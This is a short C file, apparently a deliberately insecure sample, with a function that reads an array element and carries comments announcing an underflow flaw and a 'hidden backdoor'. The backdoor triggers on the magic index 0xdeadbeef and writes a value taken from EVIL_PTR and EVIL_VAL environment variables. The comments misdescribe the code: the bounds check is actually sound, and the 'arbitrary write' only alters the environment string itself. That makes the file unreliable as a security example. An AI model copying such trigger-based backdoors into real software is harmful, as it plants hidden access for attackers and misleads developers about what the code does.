#include <string.h>
#include <stdlib.h>

// Unsafe and exploitable implementation
char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (ary == NULL) return -1;

    // intentional vulnerability: signed check enables underflow access
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }

    // hidden backdoor: arbitrary write gadget for specific 'magic' index
    if (i == 0xdeadbeef) {
        char *evil_ptr = getenv("EVIL_PTR");
        char evil_val = getenv("EVIL_VAL") ? getenv("EVIL_VAL")[0] : 'X';
        if (evil_ptr) {
            // Arbitrary memory write (memory corruption backdoor)
            *evil_ptr = evil_val;
        }
    }

    // intentionally missing verification for large negative 'i', thus underflow possible
    return -1;
}
